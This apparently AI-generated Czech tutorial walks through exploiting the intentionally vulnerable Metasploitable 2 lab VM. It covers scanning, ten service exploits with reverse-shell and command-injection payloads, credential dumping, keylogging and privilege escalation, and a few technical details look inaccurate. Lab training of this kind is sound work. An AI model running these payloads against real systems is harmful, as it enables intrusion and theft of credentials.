Generováno Claude.ai
# 🎯 Útok na Metasploitable 2 — Kompletní průvodce

> **ℹ️ CO JE METASPLOITABLE 2:** Metasploitable 2 je **záměrně zranitelný virtuální stroj** vytvořený společností Rapid7 (autoři Metasploitu) výhradně pro výuku penetračního testování. Obsahuje desítky úmyslně špatně nakonfigurovaných služeb a starých zranitelných verzí softwaru. Je to ideální a legální sandbox pro cvičení.

---

## Příprava LAB prostředí

```
┌─────────────────────────────────────────────────────┐
│                    VIRTUÁLNÍ SÍŤ                    │
│                                                     │
│  ┌──────────────────┐     ┌──────────────────────┐  │
│  │   Kali Linux     │     │  Metasploitable 2    │  │
│  │  192.168.56.101  │◄───►│   192.168.56.102     │  │
│  │  (útočník)       │     │   (cíl)              │  │
│  └──────────────────┘     └──────────────────────┘  │
│         Host-Only / NAT Network                     │
└─────────────────────────────────────────────────────┘

Nastavení v VirtualBox / VMware:
  - Obě VM na stejnou síť: Host-Only Adapter
  - Metasploitable: stáhnout z https://sourceforge.net/projects/metasploitable/
  - Výchozí login: msfadmin / msfadmin
```

### Zjistit IP adresu Metasploitable

```bash
# Na Metasploitable (po přihlášení na konzoli)
ifconfig

# Z Kali — najít živé hosty v síti
sudo nmap -sn 192.168.56.0/24

# Nebo
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

> V celém průvodci předpokládáme: **Metasploitable IP = 192.168.56.102**  
> Nahraď svojí skutečnou IP dle výsledku skenu.

---

## Obsah

1. [Fáze 1 — Reconnaissance & Scanning](#f%C3%A1ze-1--reconnaissance--scanning)
2. [Fáze 2 — Enumerace služeb](#f%C3%A1ze-2--enumerace-slu%C5%BEeb)
3. [Fáze 3 — Exploitace — přehled zranitelností](#f%C3%A1ze-3--exploitace)
4. [Exploit 01 — vsftpd 2.3.4 Backdoor](#exploit-01--vsftpd-234-backdoor)
5. [Exploit 02 — UnrealIRCd Backdoor](#exploit-02--unrealircd-backdoor)
6. [Exploit 03 — Samba MS-RPC Shell](#exploit-03--samba-ms-rpc-shell)
7. [Exploit 04 — Distcc RCE](#exploit-04--distcc-rce)
8. [Exploit 05 — IRC Backdoor přes Java RMI](#exploit-05--java-rmi-server)
9. [Exploit 06 — Tomcat Manager Upload](#exploit-06--tomcat-manager-upload)
10. [Exploit 07 — PostgreSQL + Linux Kernel](#exploit-07--postgresql)
11. [Exploit 08 — PHP CGI Argument Injection](#exploit-08--php-cgi-argument-injection)
12. [Exploit 09 — Ingreslock Backdoor](#exploit-09--ingreslock-backdoor)
13. [Exploit 10 — Ruční SSH Brute-Force](#exploit-10--ssh-brute-force)
14. [Post-Exploitation — Co dělat po RCE](#post-exploitation)
15. [Privilege Escalation — Linux](#privilege-escalation)
16. [Přehled všech portů a zranitelností](#p%C5%99ehled-v%C5%A1ech-zranitelnost%C3%AD)

---

## Fáze 1 — Reconnaissance & Scanning

### Krok 1: Nmap — kompletní sken

**Co je nmap:** Síťový skener — posílá pakety na porty cíle a podle odpovědí zjišťuje, co na nich běží.

```bash
# ═══════════════════════════════════════
# ZÁKLADNÍ SKEN — rychlý přehled
# ═══════════════════════════════════════
nmap 192.168.56.102

# ═══════════════════════════════════════
# DETEKCE VERZÍ SLUŽEB (-sV)
# Posílá banner-grabbing pakety → zjistí verzi softwaru
# ═══════════════════════════════════════
nmap -sV 192.168.56.102

# ═══════════════════════════════════════
# AGRESIVNÍ SKEN — verze + OS + skripty + traceroute
# -A kombinuje: -sV -O -sC --traceroute
# ═══════════════════════════════════════
nmap -A -T4 192.168.56.102

# ═══════════════════════════════════════
# SKEN VŠECH PORTŮ (0–65535)
# Výchozí nmap skenuje jen 1000 nejběžnějších portů!
# ═══════════════════════════════════════
nmap -p- -T4 192.168.56.102

# ═══════════════════════════════════════
# VULNERABILITY SCAN — nmap NSE skripty
# NSE = Nmap Scripting Engine, skripty v Lua
# --script vuln spustí všechny skripty kategorie "vuln"
# ═══════════════════════════════════════
nmap --script vuln 192.168.56.102

# ═══════════════════════════════════════
# UDP SKEN (pomalejší, ale důležité porty)
# ═══════════════════════════════════════
sudo nmap -sU --top-ports 100 192.168.56.102

# ═══════════════════════════════════════
# ULOŽENÍ VÝSLEDKŮ
# -oA uloží do 3 formátů najednou: .nmap, .xml, .gnmap
# ═══════════════════════════════════════
nmap -A -p- -T4 192.168.56.102 -oA msf2_scan
```

**Očekávaný výstup nmap (zkráceno):**

```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X
445/tcp   open  netbios-ssn Samba smbd 3.0.20
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell ← !!!
2049/tcp  open  nfs
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a
3632/tcp  open  distccd     distccd v1
5432/tcp  open  postgresql  PostgreSQL 8.3.0-8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
```

---

## Fáze 2 — Enumerace služeb

**Proč enumerovat:** Nmap nám řekl co běží, enumerace nám řekne **detaily** — uživatele, sdílené složky, verze, konfigurace.

### SMB Enumerace (port 139/445)

**Co je SMB:** Server Message Block — protokol pro sdílení souborů ve Windows/Linux sítích.

```bash
# ═══════════════════════════════════════
# ENUM4LINUX — komplexní SMB enumerátor
# Interně volá: rpcclient, smbclient, nmblookup
# ═══════════════════════════════════════
enum4linux -a 192.168.56.102

# Co nám řekne:
# [+] OS information      → verze OS
# [+] Users               → seznam uživatelů systému
# [+] Share Enumeration   → sdílené složky
# [+] Password Policy     → politika hesel
# [+] Groups              → skupiny uživatelů

# ═══════════════════════════════════════
# SMBCLIENT — ruční procházení sdílených složek
# ═══════════════════════════════════════
# Výpis sdílených složek (anonymně, bez hesla)
smbclient -L //192.168.56.102 -N

# Připojení ke složce
smbclient //192.168.56.102/tmp -N

# Uvnitř shellu:
smb:\> ls
smb:\> get soubor.txt
```

### HTTP Enumerace (port 80)

**Co je nikto:** Webový skener — testuje server oproti databázi tisíců zranitelností.

```bash
# Sken webserveru
nikto -h http://192.168.56.102

# Hledání skrytých adresářů
gobuster dir -u http://192.168.56.102 \
  -w /usr/share/wordlists/dirb/common.txt

# dirb — alternativa ke gobuster
dirb http://192.168.56.102

# Co najdeme:
# /phpMyAdmin  → správa MySQL přes web
# /dvwa        → Damn Vulnerable Web App
# /mutillidae  → další cvičná webová aplikace
# /tikiwiki    → CMS s výchozím heslem
```

### FTP Enumerace (port 21)

```bash
# Pokus o anonymní přístup
ftp 192.168.56.102
# Username: anonymous
# Password: (cokoli/prázdné)

# Banner grabbing — zjistit verzi
nc 192.168.56.102 21
```

### MySQL Enumerace (port 3306)

```bash
# Pokus o přístup bez hesla (root bez hesla!)
mysql -u root -h 192.168.56.102

# Nmap MySQL skripty
nmap --script mysql-info,mysql-databases,mysql-users \
  -p 3306 192.168.56.102
```

---

## Fáze 3 — Exploitace

### Spuštění Metasploitu

**Co je Metasploit Framework:**

- Nejrozšířenější exploit framework na světě
- Modulární: exploity, payloady, auxiliary moduly, post-exploitation
- `msfconsole` = interaktivní konzole pro správu všeho

```bash
# Spuštění Metasploitu
msfconsole

# Základní příkazy:
# search [výraz]         → hledání modulů
# use [modul]            → výběr modulu
# info                   → info o modulu
# show options           → zobrazit parametry
# set [PARAM] [hodnota]  → nastavit parametr
# run / exploit          → spustit útok
# sessions -l            → výpis aktivních sessions
# sessions -i [id]       → připojit se k session
# background             → session do pozadí
# help                   → nápověda
```

---

## Exploit 01 — vsftpd 2.3.4 Backdoor

### 🔍 Co je vsftpd

**vsftpd** (Very Secure FTP Daemon) je FTP server pro Linux. Verze 2.3.4 obsahuje **záměrně vloženou backdoor** — do zdrojového kódu byl v roce 2011 někým přidán backdoor kód. Pokud v přihlašovacím jménu použijeme znak `:)` (smajlík), server otevře shell na portu 6200.

### 🔍 Jak backdoor funguje

```
Normální FTP přihlášení:
  Klient → USER jmeno\n → Server: 331 Password required
  Klient → PASS heslo\n → Server: 230 Login successful

Backdoor trigger:
  Klient → USER cokoliv:)\n → Server spustí /bin/sh na portu 6200
  Klient → PASS cokoliv\n
  Klient → nc 192.168.56.102 6200 → dostane root shell!
```

### 🔍 Exploit pomocí Metasploitu

```bash
# V msfconsole:

# Vyhledat modul
msf6 > search vsftpd

# Výstup:
# exploit/unix/ftp/vsftpd_234_backdoor  → náš modul

# Načíst modul
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# Zobrazit potřebné parametry
msf6 exploit(vsftpd_234_backdoor) > show options

# Required Options:
# RHOSTS → IP cíle
# RPORT  → port (výchozí 21)

# Nastavit cíl
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.102

# Spustit exploit
msf6 exploit(vsftpd_234_backdoor) > run

# Výsledek:
# [*] Banner: 220 (vsFTPd 2.3.4)
# [*] USER: 331 Please specify the password.
# [+] Backdoor service has been spawned, handling...
# [+] UID: uid=0(root) gid=0(root)
# [*] Command shell session 1 opened

# Máme root shell!
id
# uid=0(root) gid=0(root) groups=0(root)

whoami
# root
```

### 🔍 Ruční exploit (bez Metasploitu)

```bash
# Terminál 1 — spustit Netcat listener
nc -lvnp 6200

# Terminál 2 — triggerovat backdoor
echo -e "USER user:)\nPASS pass" | nc 192.168.56.102 21
# Počkat ~3 sekundy... pak v Terminálu 1 dostaneme shell

# Nebo interaktivně přes FTP:
ftp 192.168.56.102
# Name: user:)
# Password: cokoliv
# Pak: Ctrl+C a připojit na port 6200
nc 192.168.56.102 6200
id  # uid=0(root)
```

---

## Exploit 02 — UnrealIRCd Backdoor

### 🔍 Co je UnrealIRCd

**UnrealIRCd** je IRC (Internet Relay Chat) server. Verze 3.2.8.1 distribuovaná v roce 2009 obsahovala backdoor vloženou do zdrojového kódu útočníky, kteří kompromitovali distribuční server. Backdoor spouští libovolný shell příkaz zaslaný se speciálním prefixem `AB`.

### 🔍 Jak backdoor funguje

```
IRC komunikace: klient posílá textové příkazy serveru
Backdoor: pokud zpráva začíná "AB", server spustí zbytek jako shell příkaz

Normální:  USER nick nick nick :realname
Backdoor:  AB; id\n  → server spustí "id" jako root
```

### 🔍 Exploit pomocí Metasploitu

```bash
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor

msf6 exploit(unreal_ircd_3281_backdoor) > show options
# RHOSTS → cíl
# RPORT  → 6667 (IRC port)

msf6 exploit(unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.102

# Výběr payloadu — reverse shell (cíl se připojí zpět k nám)
msf6 exploit(unreal_ircd_3281_backdoor) > set PAYLOAD \
  cmd/unix/reverse

# Náš IP (Kali) pro reverse connection
msf6 exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.56.101

msf6 exploit(unreal_ircd_3281_backdoor) > run

# Výsledek:
# [*] Started reverse TCP double handler on 192.168.56.101:4444
# [*] Connected to 192.168.56.102:6667...
# [*] Sending backdoor command...
# [*] Command shell session 2 opened
id
# uid=0(root)
```

### 🔍 Ruční exploit

```bash
# Listener na Kali
nc -lvnp 4444

# Triggering backdoor přes netcat
echo "AB; bash -i >& /dev/tcp/192.168.56.101/4444 0>&1" \
  | nc 192.168.56.102 6667
```

---

## Exploit 03 — Samba MS-RPC Shell

### 🔍 Co je Samba

**Samba** je open-source implementace SMB/CIFS protokolu pro Linux — umožňuje sdílení souborů s Windows. Verze 3.0.20 obsahuje zranitelnost v MS-RPC (vzdálené volání procedur) — chybí sanitizace vstupů v `username` poli, čímž vzniká **command injection**.

### 🔍 Jak zranitelnost funguje

```
Normální MS-RPC autentizace:
  username: "jmeno"
  password: "heslo"

Exploit — command injection v username:
  username: "/=`nohup bash -i >& /dev/tcp/LHOST/LPORT 0>&1`"
  Samba spustí obsah backtick `` ` ` `` jako shell příkaz!
```

### 🔍 Exploit pomocí Metasploitu

```bash
msf6 > search samba usermap

# Výsledek: exploit/multi/samba/usermap_script

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 192.168.56.102
msf6 exploit(usermap_script) > set LHOST 192.168.56.101

# Zobrazit dostupné payloady
msf6 exploit(usermap_script) > show payloads

msf6 exploit(usermap_script) > set PAYLOAD \
  cmd/unix/reverse_netcat

msf6 exploit(usermap_script) > run

# [*] Started reverse TCP handler on 192.168.56.101:4444
# [*] Command shell session 3 opened
id
# uid=0(root)
```

---

## Exploit 04 — Distcc RCE

### 🔍 Co je Distcc

**distcc** je nástroj pro distribuci kompilace kódu přes síť — rozděluje práci překladače (GCC) na více strojů. Port 3632. Chybí jakékoli ověření autenticity — přijme kompilační úkol od kohokoliv a spustí ho jako uživatel `daemon`.

### 🔍 Jak exploit funguje

```
distcc protokol:
  Klient pošle: "DIST00000001" + argumenty kompilátoru
  Server spustí gcc s danými argumenty

Exploit:
  Místo gcc argumentů pošleme shell příkaz
  Server ho spustí jako daemon uživatel
  → ne root, ale daemon má dost práv pro další eskalaci
```

### 🔍 Exploit pomocí Metasploitu

```bash
msf6 > search distcc

# exploit/unix/misc/distcc_exec

msf6 > use exploit/unix/misc/distcc_exec
msf6 exploit(distcc_exec) > set RHOSTS 192.168.56.102
msf6 exploit(distcc_exec) > set LHOST 192.168.56.101
msf6 exploit(distcc_exec) > set PAYLOAD cmd/unix/reverse_bash

msf6 exploit(distcc_exec) > run

# [*] Command shell session 4 opened
id
# uid=1(daemon) gid=1(daemon)
# → daemon, ne root → potřeba privilege escalation
```

### 🔍 Ruční exploit (Python skript)

```bash
# nmap NSE skript pro distcc
nmap --script distcc-exec --script-args="distcc-exec.cmd='id'" \
  -p 3632 192.168.56.102

# Výstup: uid=1(daemon) gid=1(daemon)
```

---

## Exploit 05 — Java RMI Server

### 🔍 Co je Java RMI

**Java RMI** (Remote Method Invocation) umožňuje volání Java metod přes síť. Port 1099. Starší verze Java RMI registry neověřují zdroj příkazů — umožňují načíst libovolný vzdálený objekt z útočníkova serveru a spustit ho.

```bash
msf6 > search java_rmi

# exploit/multi/misc/java_rmi_server

msf6 > use exploit/multi/misc/java_rmi_server
msf6 exploit(java_rmi_server) > set RHOSTS 192.168.56.102
msf6 exploit(java_rmi_server) > set LHOST 192.168.56.101

# Java Meterpreter payload
msf6 exploit(java_rmi_server) > set PAYLOAD \
  java/meterpreter/reverse_tcp

msf6 exploit(java_rmi_server) > run

# [*] Meterpreter session 5 opened
meterpreter > sysinfo
meterpreter > getuid
# uid=0(root)
```

---

## Exploit 06 — Tomcat Manager Upload

### 🔍 Co je Apache Tomcat

**Apache Tomcat** je Java webový server (port 8180). Obsahuje /manager/ rozhraní pro nasazení Java webových aplikací (.war soubory). Metasploitable má Tomcat s **výchozími credentials** (tomcat/tomcat) a povolený manager.

### 🔍 Jak exploit funguje

```
Apache Tomcat Manager:
  URL: http://192.168.56.102:8180/manager/html
  Výchozí login: tomcat / tomcat

Útok:
  1. Přihlásíme se do manageru
  2. Nahrajeme malicózní .WAR soubor (= Java web app)
  3. .WAR obsahuje JSP shell (webshell)
  4. Tomcat nasadí aplikaci → máme shell
```

### 🔍 Exploit pomocí Metasploitu

```bash
msf6 > search tomcat_mgr

# exploit/multi/http/tomcat_mgr_upload

msf6 > use exploit/multi/http/tomcat_mgr_upload

# Zobrazit a nastavit parametry
msf6 exploit(tomcat_mgr_upload) > show options

msf6 exploit(tomcat_mgr_upload) > set RHOSTS 192.168.56.102
msf6 exploit(tomcat_mgr_upload) > set RPORT 8180
msf6 exploit(tomcat_mgr_upload) > set HttpUsername tomcat
msf6 exploit(tomcat_mgr_upload) > set HttpPassword tomcat
msf6 exploit(tomcat_mgr_upload) > set LHOST 192.168.56.101

# Java Meterpreter
msf6 exploit(tomcat_mgr_upload) > set PAYLOAD \
  java/meterpreter/reverse_tcp

msf6 exploit(tomcat_mgr_upload) > run

# [*] Uploading 6281 bytes as bBpDL.war ...
# [*] Executing /bBpDL/TvxP.jsp...
# [*] Meterpreter session 6 opened

meterpreter > sysinfo
meterpreter > shell
id
# uid=65534(nobody) gid=65534(nogroup)
```

### 🔍 Ruční exploit

```bash
# 1. Vygenerovat malicózní WAR soubor
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.56.101 LPORT=4444 \
  -f war -o shell.war

# 2. Nahrát přes curl
curl -u tomcat:tomcat \
  http://192.168.56.102:8180/manager/text/deploy?path=/shell \
  --upload-file shell.war

# 3. Spustit listener
nc -lvnp 4444

# 4. Triggerovat shell
curl http://192.168.56.102:8180/shell/
```

---

## Exploit 07 — PostgreSQL

### 🔍 Co je PostgreSQL

**PostgreSQL** je relační databáze (port 5432). Na Metasploitable běží bez hesla pro uživatele `postgres`. Metasploit PostgreSQL exploit využívá funkci `COPY TO/FROM PROGRAM` pro spuštění shell příkazů přímo z SQL dotazu.

```bash
# ═══════════════════════════════════════
# PŘÍMÝ PŘÍSTUP (bez hesla!)
# ═══════════════════════════════════════
psql -h 192.168.56.102 -U postgres
# Password: (prázdné/postgres)

postgres=# \l          -- výpis databází
postgres=# \du         -- výpis uživatelů
postgres=# SELECT version();

# ═══════════════════════════════════════
# METASPLOIT — PostgreSQL EXEC
# ═══════════════════════════════════════
msf6 > use exploit/linux/postgres/postgres_payload
msf6 exploit(postgres_payload) > set RHOSTS 192.168.56.102
msf6 exploit(postgres_payload) > set LHOST 192.168.56.101
msf6 exploit(postgres_payload) > set PASSWORD ""
msf6 exploit(postgres_payload) > run

# Nebo auxiliary modul pro command execution:
msf6 > use auxiliary/admin/postgres/postgres_sql
msf6 auxiliary(postgres_sql) > set RHOSTS 192.168.56.102
msf6 auxiliary(postgres_sql) > set SQL "select version()"
msf6 auxiliary(postgres_sql) > run
```

---

## Exploit 08 — PHP CGI Argument Injection

### 🔍 Co je CVE-2012-1823

Webserver Apache na Metasploitable používá **PHP v5.3.4** v CGI módu. Zranitelnost spočívá v tom, že PHP CGI handler při zpracování URL nesprávně filtruje argumenty — umožní předat `-d` přepínač přímo PHP interpreteru, který pak vykoná libovolný PHP kód.

```bash
# ═══════════════════════════════════════
# MANUÁLNÍ TEST — ověření zranitelnosti
# ═══════════════════════════════════════

# Normální request:
curl http://192.168.56.102/

# Injection test:
curl "http://192.168.56.102/index.php?-s"
# Pokud vrátí zdrojový kód PHP → server je zranitelný

# RCE přes query string:
curl "http://192.168.56.102/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input" \
  --data "<?php system('id'); ?>"
# uid=33(www-data)

# ═══════════════════════════════════════
# METASPLOIT
# ═══════════════════════════════════════
msf6 > use exploit/multi/http/php_cgi_arg_injection

msf6 exploit(php_cgi_arg_injection) > set RHOSTS 192.168.56.102
msf6 exploit(php_cgi_arg_injection) > set LHOST 192.168.56.101
msf6 exploit(php_cgi_arg_injection) > set PAYLOAD \
  php/meterpreter/reverse_tcp

msf6 exploit(php_cgi_arg_injection) > run

# [*] Meterpreter session opened
meterpreter > getuid
# www-data
```

---

## Exploit 09 — Ingreslock Backdoor

### 🔍 Co je port 1524

Port 1524 na Metasploitable je **záměrně nastavená backdoor** — přímý root shell dostupný bez jakékoli autentizace. Stačí se připojit přes netcat.

```bash
# ═══════════════════════════════════════
# NEJJEDNODUŠŠÍ EXPLOIT NA METASPLOITABLE
# ═══════════════════════════════════════

# Připojení přes netcat
nc 192.168.56.102 1524

# Okamžitě dostaneme root shell:
root@metasploitable:/# id
# uid=0(root) gid=0(root) groups=0(root)

root@metasploitable:/# whoami
# root

# Nebo telnet
telnet 192.168.56.102 1524
```

> 💡 Toto je záměrná backdoor přidaná tvůrci Metasploitable pro rychlé cvičení.

---

## Exploit 10 — SSH Brute-Force

### 🔍 Co je SSH Brute-Force

SSH (port 22) na Metasploitable používá **slabá výchozí hesla**. Hydra je paralelní login cracker — rychle zkouší kombinace jmen a hesel.

```bash
# ═══════════════════════════════════════
# HYDRA — SSH brute-force
# Co je hydra: paralelní síťový login cracker
# Jak funguje: posílá autentizační pokusy paralelně
# ═══════════════════════════════════════

# Brute-force s wordlistem hesel, uživatel msfadmin
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.56.102 -t 4

# Brute-force s listem uživatelů
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
  -P /usr/share/wordlists/metasploit/unix_passwords.txt \
  ssh://192.168.56.102 -t 4 -V

# Výsledek:
# [22][ssh] host: 192.168.56.102   login: msfadmin   password: msfadmin
# [22][ssh] host: 192.168.56.102   login: user        password: user
# [22][ssh] host: 192.168.56.102   login: service     password: service

# ═══════════════════════════════════════
# METASPLOIT — SSH Login Scanner
# ═══════════════════════════════════════
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(ssh_login) > set RHOSTS 192.168.56.102
msf6 auxiliary(ssh_login) > set USER_FILE \
  /usr/share/wordlists/metasploit/unix_users.txt
msf6 auxiliary(ssh_login) > set PASS_FILE \
  /usr/share/wordlists/metasploit/unix_passwords.txt
msf6 auxiliary(ssh_login) > set VERBOSE false
msf6 auxiliary(ssh_login) > run

# Po nalezení credentials:
ssh msfadmin@192.168.56.102
# password: msfadmin
```

---

## Post-Exploitation

**Post-exploitation** = co děláme poté, co máme přístup do systému. Cílem je sbírat informace, rozšiřovat přístup a demonstrovat dopad útoku.

### Meterpreter — základní příkazy

```bash
# ═══════════════════════════════════════
# SYSTÉMOVÉ INFORMACE
# ═══════════════════════════════════════
meterpreter > sysinfo
# Computer : metasploitable
# OS       : Linux metasploitable 2.6.24-16-server
# Arch     : i686

meterpreter > getuid
# Server username: uid=0, gid=0, euid=0, egid=0

meterpreter > getpid
# Current pid: 4242

meterpreter > ps
# Výpis všech procesů

# ═══════════════════════════════════════
# PRÁCE SE SOUBORY
# ═══════════════════════════════════════
meterpreter > ls
meterpreter > cd /etc
meterpreter > cat /etc/passwd
meterpreter > cat /etc/shadow    # hashe hesel!

# Stažení souboru na Kali
meterpreter > download /etc/shadow /tmp/shadow.txt
meterpreter > download /etc/passwd /tmp/passwd.txt

# Nahrání souboru na cíl
meterpreter > upload /tmp/linpeas.sh /tmp/linpeas.sh

# ═══════════════════════════════════════
# SBÍRÁNÍ CITLIVÝCH DAT
# ═══════════════════════════════════════

# Výpis hesel z shadow (hashe)
meterpreter > shell
cat /etc/shadow

# MySQL credentials
cat /etc/mysql/my.cnf
cat /var/www/dvwa/config/config.inc.php

# SSH klíče
ls -la /root/.ssh/
ls -la /home/*/.ssh/

# Historie příkazů
cat /root/.bash_history
cat /home/msfadmin/.bash_history

# Hledání config souborů s hesly
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# ═══════════════════════════════════════
# SÍŤOVÝ PRŮZKUM (z kompromitovaného stroje)
# ═══════════════════════════════════════
meterpreter > route

# Z shell:
netstat -tuln    # aktivní spojení
arp -a           # ARP tabulka (ostatní stroje v síti)
cat /etc/hosts

# ═══════════════════════════════════════
# SCREENSHOTS A MONITORING
# ═══════════════════════════════════════
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump

# ═══════════════════════════════════════
# PORTFORWARDING — pivoting
# Přesměrování portu z Metasploitable na Kali
# ═══════════════════════════════════════
meterpreter > portfwd add -l 3306 -p 3306 -r 127.0.0.1
# Teď můžeme přistupovat k MySQL na 127.0.0.1:3306 z Kali
```

### Cracking hashů z /etc/shadow

```bash
# Stáhnout soubory na Kali
meterpreter > download /etc/shadow /tmp/
meterpreter > download /etc/passwd /tmp/

# Kombinovat pro John
unshadow /tmp/passwd /tmp/shadow > /tmp/combined.txt

# John the Ripper
john /tmp/combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Zobrazit prolomená hesla
john /tmp/combined.txt --show

# Nebo hashcat
hashcat -m 1800 /tmp/shadow /usr/share/wordlists/rockyou.txt
# -m 1800 = sha-512crypt (Linux)
```

---

## Privilege Escalation

Pokud jsme získali shell jako neprivilegovaný uživatel (daemon, www-data), potřebujeme eskalovat na root.

### LinPEAS — automatická detekce

**Co je linpeas:** Shell skript, který spouští stovky kontrolních příkazů a hledá cesty pro privilege escalation. Výsledky barevně kóduje podle závažnosti.

```bash
# Na Kali — stáhnout linpeas
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Přenést na cíl
# Metoda 1 — HTTP server na Kali
cd /tmp && python3 -m http.server 8000

# Na cíli (v shellu):
wget http://192.168.56.101:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt

# Metoda 2 — přes Meterpreter
meterpreter > upload linpeas.sh /tmp/linpeas.sh
meterpreter > shell
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

### Manuální privilege escalation na Metasploitable

```bash
# ═══════════════════════════════════════
# 1. SUDO PRÁVA
# ═══════════════════════════════════════
sudo -l
# Na Metasploitable: msfadmin má sudo bez hesla na vše!
sudo /bin/bash
id  # root!

# ═══════════════════════════════════════
# 2. SUID BINÁRIE — hledání
# ═══════════════════════════════════════
find / -perm -4000 -type f 2>/dev/null

# Zajímavé SUID binárie:
# /usr/bin/nmap  → starý nmap má interaktivní mód → root shell!
nmap --interactive
nmap> !sh
id  # root!

# /bin/su, /usr/bin/sudo, atd.

# ═══════════════════════════════════════
# 3. KERNEL EXPLOIT
# ═══════════════════════════════════════
uname -r
# Linux 2.6.24 → velmi starý kernel → desítky exploitů

searchsploit "linux kernel 2.6.24"

# Vyhledat a stáhnout exploit
searchsploit -m 8572   # například

# Zkompilovat na cíli
gcc exploit.c -o exploit
./exploit
id  # root
```

### Metasploit Local Exploit Suggester

```bash
# Automaticky navrhne vhodné local exploity
msf6 > use post/multi/recon/local_exploit_suggester

msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > run

# Výstup — seznam exploitů vhodných pro daný systém:
# [+] exploit/linux/local/udev_netlink → pravděpodobně funguje
# [+] exploit/linux/local/sock_sendpage → pravděpodobně funguje
```

---

## Přehled všech zranitelností

|Port|Služba|Verze|Zranitelnost|Přístup|
|---|---|---|---|---|
|21|FTP|vsftpd 2.3.4|Backdoor (smajlík)|root|
|22|SSH|OpenSSH 4.7p1|Slabá hesla|user→root|
|23|Telnet|-|Plaintext přenos|user|
|25|SMTP|Postfix|Enumerace uživatelů|info|
|80|HTTP|Apache 2.2.8|PHP CGI injection, DVWA|www-data|
|139/445|SMB|Samba 3.0.20|Usermap script|root|
|1099|Java RMI|-|Remote class loading|root|
|1524|Shell|-|Otevřená backdoor|root|
|2121|FTP|ProFTPD 1.3.1|SQL injection v mod_sql|root|
|3306|MySQL|5.0.51a|Bez hesla, root|root|
|3632|distcc|v1|Neověřený RCE|daemon|
|5432|PostgreSQL|8.3.0|Bez hesla|postgres|
|5900|VNC|3.3|Slabé heslo "password"|root|
|6667|IRC|UnrealIRCd 3.2.8.1|Backdoor|root|
|8180|HTTP|Tomcat 5.5|Výchozí credentials|tomcat|

### Rychlý přístup k VNC

```bash
# VNC heslo na Metasploitable je "password"
vncviewer 192.168.56.102
# Password: password
# → grafické root prostředí!
```

### MySQL bez hesla

```bash
mysql -u root -h 192.168.56.102
# Žádné heslo potřeba

mysql> show databases;
mysql> use dvwa;
mysql> show tables;
mysql> select * from users;
# Vidíme hashe hesel DVWA uživatelů!
```

---

## Tipy pro efektivní cvičení

```
DOPORUČENÝ POSTUP PRO ZAČÁTEČNÍKY:

1. Spusť Metasploitable a Kali ve stejné síti
2. Zjisti IP adresu (nmap -sn)
3. Spusť plný nmap sken (nmap -A -p-)
4. Projdi každý port a vyzkoušej příslušný exploit
5. Po každém úspěchu: co dál? Sbírej data, eskaluj práva
6. Dokumentuj každý krok (screenshot, příkazy, výstupy)
7. Zkus každý exploit i manuálně (bez Metasploitu)

DOBRÉ OTÁZKY PO KAŽDÉM EXPLOITU:
  - Proč tato zranitelnost existuje?
  - Jak by se dala opravit?
  - Jak by ji detekoval IDS?
  - Jaký je reálný dopad v produkci?

CERTIFIKACE VHODNÉ PRO CVIČENÍ NA METASPLOITABLE:
  - eJPT (eLearnSecurity Junior Pentester) → ideální start
  - OSCP (Offensive Security) → používá podobné stroje
  - TryHackMe / HackTheBox → online platformy se stejnými koncepty
```

---

> **📚 Co dál po Metasploitable 2:**
> 
> - **VulnHub** — stovky dalších záměrně zranitelných VM
> - **HackTheBox** — online platforma s realistickými stroji
> - **TryHackMe** — strukturované učební cesty
> - **Metasploitable 3** — Windows a Linux verze s novějšími zranitelnostmi